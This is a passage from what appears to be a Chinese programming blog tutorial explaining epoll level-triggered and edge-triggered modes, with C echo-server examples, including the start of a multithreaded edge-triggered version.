class="literal">NULL</span>);</span><br><span class="line">                    close(fd);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;客户端[%s:%d]: %s&quot;</span>, cip, cport, buf);</span><br><span class="line">                <span class="comment">/* 转换成大写字母 */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">buf[i] &amp;= <span class="number">0xdf</span>;</span><br><span class="line">&#125;</span><br><span class="line">                <span class="comment">/* 发送数据 */</span></span><br><span class="line">res = send(fd, buf, len, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (res == <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="type">char</span> error[MSGSIZE];</span><br><span class="line"><span class="built_in">sprintf</span>(error, <span class="string">&quot;向客户端[%s:%d]发送数据失败&quot;</span>, cip, cport);</span><br><span class="line">perror(error);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(epoll);</span><br><span class="line">    close(lfd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>触发模式是针对<code>epoll</code>树里的某个节点的，或者说某个节点的<code>event</code></p><p>水平触发模式：代码里的<code>buf</code>就这么大，每次读取不能将文件描述符的读缓冲区里数据全部读完，这样在下次循环检测的时候，这个文件描述符的读缓冲区仍然会被标记为就绪状态，且仍然从上次没读取完的数据开始读取。对于写缓冲区来说，只要写缓冲区不是满的就是就绪状态，<code>epoll</code>每次都会发送通知。</p><p>边沿触发模式：代码里的<code>buf</code>就这么大，如果这次没有将读缓冲区里的数据全部读完，在下次循环中<code>epoll</code>不会再把这个缓冲区标记为就绪状态，也不会返回通知，只有当下一条数据从客户端接收到，这个读缓冲区才会被标记为就绪状态。对于写缓冲区来说，一开始空的，<code>epoll</code>标记为就绪状态，只返回这一次通知，后面即使写缓冲区没满也不会通知，下次通知只有在写缓冲区从满到不满，写缓冲区才会被标记为就绪返回通知。</p><p>对于读缓冲区来说：</p><ul><li>水平触发模式(默认)：只要缓冲区内数据没有读完，就会被标记为就绪，在下次检测时会返回通知</li><li>边沿触发模式：只有当新的数据到达时，才会被标记为就绪，在下次检测时返回通知</li></ul><p>对于写缓冲区来说：</p><ul><li>水平触发模式(默认)：只要缓冲区内还没有写满，就会被标记为就绪，在下次检测时会返回通知</li><li>边沿触发模式：只有当缓冲区从满到不满，或者一开始就是不满时才会被标记为就绪，在下次检测时返回通知</li></ul><p><code>recv()</code>函数能否调用，能否读取内核中读缓冲区的数据，这与<code>epoll</code>或者说<code>IO多路复用</code>的返回值无关，真正能决定<code>recv()</code>函数还能不能继续读下去的应该是缓冲区本身有记录的接收到的字节数这个成员变量。但是每次调用<code>recv()</code>函数的开销是很大的，什么时候调用，而让<code>recv()</code>每次都能读取到数据，不会跑空，不会因此而阻塞，换句话说我们在调用<code>recv()</code>函数前就需要知道读缓冲区的情况才能更好的决定是否要调用<code>recv()</code>函数。内核提供的<code>IO多路复用</code>就是为此而存在的，像<code>select()</code>、<code>epoll_wait()</code>这样的函数，就能够让内核在内核态中检测各个读缓冲区的情况，再返回通知告诉我们哪些<code>socket</code>的缓冲区是有数据的，让我们可以挑这些有数据的缓冲区去高效地调用<code>recv()</code>。而让内核决定是否对某个缓冲区返回通知，这就是两种触发模式地区别。</p><p>边沿触发模式代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NR_CLIENTS 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EPOLL 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EVSSIZE 1024</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSGSIZE 128</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> PORT = <span class="number">8080</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 设置服务器本地地址 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">addr</span>;</span></span><br><span class="line">    addr.sin_family = AF_INET;</span><br><span class="line">    addr.sin_port = htons(PORT);</span><br><span class="line">    addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> res;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 创建lfd作为监听socket */</span></span><br><span class="line">    <span class="type">int</span> lfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (lfd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;lfd创建失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 绑定addr到lfd上 */</span></span><br><span class="line">    res = bind(lfd, (<span class="keyword">struct</span> sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr));</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;lfd绑定失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 开始在lfd上监听,数组大小设置为128 */</span></span><br><span class="line">    res = listen(lfd, NR_CLIENTS);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;lfd监听失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 创建一个epoll树 */</span></span><br><span class="line">    <span class="type">int</span> epoll = epoll_create(EPOLL);</span><br><span class="line">    <span class="keyword">if</span> (epoll == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;epoll创建失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 创建公共变量 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">events</span>[<span class="title">EVSSIZE</span>];</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">cad</span>;</span></span><br><span class="line">    <span class="type">socklen_t</span> cadlen = <span class="keyword">sizeof</span>(cad);</span><br><span class="line">    <span class="type">char</span> cip[<span class="number">32</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> cport;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 添加lfd到epoll中 */</span></span><br><span class="line">    event.events = EPOLLIN | EPOLLET; <span class="comment">/* 将这个监听节点设置为边沿触发模式 */</span></span><br><span class="line">    event.data.fd = lfd;</span><br><span class="line">    epoll_ctl(epoll, EPOLL_CTL_ADD, lfd, &amp;event);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="type">int</span> event_count = epoll_wait(epoll, events, EVSSIZE, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; event_count; i++) &#123;</span><br><span class="line">            <span class="type">int</span> fd = events[i].data.fd;</span><br><span class="line">            <span class="keyword">if</span> (fd == lfd) &#123;</span><br><span class="line">                <span class="type">int</span> cfd = accept(lfd, (<span class="keyword">struct</span> sockaddr*)&amp;cad, &amp;cadlen);</span><br><span class="line">                <span class="comment">/* 设置cfd为非阻塞属性 */</span></span><br><span class="line">                <span class="type">int</span> flag = fcntl(cfd, F_GETFL);</span><br><span class="line">                flag |= O_NONBLOCK;</span><br><span class="line">                fcntl(cfd, F_SETFL, flag);</span><br><span class="line">                <span class="comment">/* 设置事件和添加cfd到epoll上 */</span></span><br><span class="line">                event.events = EPOLLIN | EPOLLET;</span><br><span class="line">                event.data.fd = cfd;</span><br><span class="line">                epoll_ctl(epoll, EPOLL_CTL_ADD, cfd, &amp;event);</span><br><span class="line">                inet_ntop(AF_INET, &amp;cad.sin_addr.s_addr, cip, <span class="keyword">sizeof</span>(cip));</span><br><span class="line">    cport = ntohs(cad.sin_port);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;与客户端[%s:%d]连接成功\n&quot;</span>, cip, cport);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">unsigned</span> <span class="type">char</span> buf[BUFSIZE];</span><br><span class="line">                <span class="comment">/* 获取客户端地址 */</span></span><br><span class="line">                res = getpeername(fd, (<span class="keyword">struct</span> sockaddr*)&amp;cad, &amp;cadlen);</span><br><span class="line">                <span class="keyword">if</span> (res == <span class="number">-1</span>) &#123;</span><br><span class="line">                    <span class="type">char</span> error[MSGSIZE];</span><br><span class="line">                    <span class="built_in">sprintf</span>(error, <span class="string">&quot;fd:%d获取客户端地址失败&quot;</span>, fd);</span><br><span class="line">                    perror(error);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">/* 设置客户端ip和port */</span></span><br><span class="line">                inet_ntop(AF_INET, &amp;cad.sin_addr.s_addr, cip, <span class="keyword">sizeof</span>(cip));</span><br><span class="line">                cport = ntohs(cad.sin_port);</span><br><span class="line">                <span class="comment">/* 接收数据 */</span></span><br><span class="line">                <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="type">int</span> len = recv(fd, buf, <span class="keyword">sizeof</span>(buf)<span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">                    <span class="comment">/* 如果读缓冲区空了,或者文件描述符失效了返回recv()返回-1</span></span><br><span class="line"><span class="comment">                        如果客户端发出了断开连接请求,recv()函数返回0</span></span><br><span class="line"><span class="comment">                        如果客户端正常通信发送字节流,recv()函数返回已经读入buf的字节数    </span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    <span class="keyword">if</span> (len == <span class="number">-1</span>) &#123;</span><br><span class="line">                        <span class="type">char</span> error[MSGSIZE];</span><br><span class="line">                        <span class="keyword">if</span> (errno == EAGAIN) &#123;</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">&quot;数据接收完毕...\n&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (len == <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="type">char</span> message[MSGSIZE];</span><br><span class="line">                        <span class="built_in">sprintf</span>(message, <span class="string">&quot;与客户端[%s:%d]断开连接\n&quot;</span>, cip, cport);</span><br><span class="line">                        <span class="built_in">printf</span>(message);</span><br><span class="line">                        epoll_ctl(epoll, EPOLL_CTL_DEL, fd, <span class="literal">NULL</span>);</span><br><span class="line">                        close(fd);</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;客户端[%s:%d]: %s&quot;</span>, cip, cport, buf);</span><br><span class="line">                    <span class="comment">/* 转换成大写字母 */</span></span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">                        buf[i] &amp;= <span class="number">0xdf</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">/* 发送数据 */</span></span><br><span class="line">                    res = send(fd, buf, len, <span class="number">0</span>);</span><br><span class="line">                    <span class="keyword">if</span> (res == <span class="number">-1</span>) &#123;</span><br><span class="line">                        <span class="type">char</span> error[MSGSIZE];</span><br><span class="line">                        <span class="built_in">sprintf</span>(error, <span class="string">&quot;向客户端[%s:%d]发送数据失败&quot;</span>, cip, cport);</span><br><span class="line">                        perror(error);</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(epoll);</span><br><span class="line">    close(lfd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基于边沿触发模式的多线程代码</p><p>每次有新连接时会创建一个线程，建立连接后线程马上就会销毁</p><p>在已经建立的连接上，如果客户端发来数据，就会创建一个线程，处理完数据后线程马上销毁</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NR_CLIENTS 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EPOLL 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EVSSIZE 1024</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSGSIZE 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DATASIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">accept_t</span> <span class="title">accept_t</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">accept_t</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> lfd;</span><br><span class="line">    <span class="type">int</span> epoll;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span>* <span class="title function_">acceptance</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">accept_t</span>* args = (<span class="type">accept_t</span>*)arg;</span><br><span class="line">    <span class="type">int</span> lfd = args-&gt;lfd;</span><br><span class="line">    <span class="type">int</span> epoll = args-&gt;epoll;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">cad</span>;</span></span><br><span class="line">    <span class="type">socklen_t</span> cadlen = <span class="keyword">sizeof</span>(cad);</span><br><span class="line">    <span class="type">char</span> cip[<span class="number">32</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> cport;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> cfd = accept(lfd, (<span class="keyword">struct</span> sockaddr*)&amp;cad, &amp;cadlen);</span><br><span class="line">    <span class="comment">/* 设置cfd为非阻塞属性 */</span></span><br><span class="line">    <span class="type">int</span> flag = fcntl(cfd, F_GETFL);</span><br><span class="line">    flag |= O_NONBLOCK;</span><br><span class="line">    fcntl(cfd, F_SETFL, flag);</span><br><span class="line">    <span class="comment">/* 设置事件和添加cfd到epoll上 */</span></span><br><span class="line">    event.events = EPOLLIN | EPOLLET;</span><br><span class="line">    event.data.fd = cfd;</span><br><span class="line">    epoll_ctl(epoll, EPOLL_CTL_ADD, cfd, &amp;event);</span><br><span class="line">    inet_ntop(AF_INET, &amp;cad.sin_addr.s_addr, cip, <span class="keyword">sizeof</span>(cip));</span><br><span class="line">cport = ntohs(cad.sin_port);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;与客户端[%s:%d]连接成功\n&quot;</span>, cip, cport);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(args);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">commu_t</span> <span class="title">commu_t</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">commu_t</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">int</span> epoll;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span>* <span class="title function_">communication</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">commu_t</span>* args = (<span class="type">commu_t</span>*)arg;</span><br><span class="line">    <span class="type">int</span> fd = args-&gt;fd;</span><br><span class="line">    <span class="type">int</span> epoll = args-&gt;epoll;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">cad</span>;</span></span><br><span class="line">    <span class="type">socklen_t</span> cadlen = <span class="keyword">sizeof</span>(cad);</span><br><span class="line">    <span class="type">char</span> cip[<span class="number">32</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> cport;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取客户端地址 */</span></span><br><span class="line">    <span class="type">int</span> res = getpeername(fd, (<span class="keyword">struct</span> sockaddr*)&amp;cad, &amp;cadlen);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="type">char</span> error[MSGSIZE];</span><br><span class="line">        <span class="built_in">sprintf</span>(error, <span class="string">&quot;fd:%d获取客户端地址失败&quot;</span>, fd);</span><br><span class="line">        perror(error);</span><br><span class="line">        pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 设置客户端ip和port */</span></span><br><span class="line">    inet_ntop(AF_INET, &amp;cad.sin_addr.s_addr, cip, <span class="keyword">sizeof</span>(cip));</span><br><span class="line">    cport = ntohs(cad.sin_port);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[BUFSIZE];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> data[DATASIZE];</span><br><span class="line">    <span class="built_in">memset</span>(data, <span class="number">0</span>, <span class="keyword">sizeof</span>(data));</span><br><span class="line">    <span class="comment">/* 接收数据 */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="type">int</span> len = recv(fd, buf, <span class="keyword">sizeof</span>(buf)<span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">/* 如果读缓冲区空了,或者文件描述符失效了返回recv()返回-1</span></span><br><span class="line"><span class="comment">            如果客户端发出了断开连接请求,recv()函数返回0</span></span><br><span class="line"><span class="comment">            如果客户端正常通信发送字节流,recv()函数返回已经读入buf的字节数    </span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (len == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="type">char</span> error[MSGSIZE];</span><br><span class="line">            <span class="keyword">if</span> (errno == EAGAIN) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;数据接收完毕...\n&quot;</span>);</span><br><span class="line">                <span class="comment">/* 发送数据 */</span></span><br><span class="line">                res = send(fd, data, <span class="built_in">strlen</span>(data) + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> (res == <span class="number">-1</span>) &#123;</span><br><span class="line">                    <span class="built_in">sprintf</span>(error, <span class="string">&quot;向客户端[%s:%d]发送数据失败&quot;</span>, cip, cport);</span><br><span class="line">                    perror(error);</span><br><span class="line">                    pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (len == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">char</span> message[MSGSIZE];</span><br><span class="line">            <span class="built_in">sprintf</span>(message, <span class="string">&quot;与客户端[%s:%d]断开连接\n&quot;</span>, cip, cport);</span><br><span class="line">            <span class="built_in">printf</span>(message);</span><br><span class="line">            epoll_ctl(epoll, EPOLL_CTL_DEL, 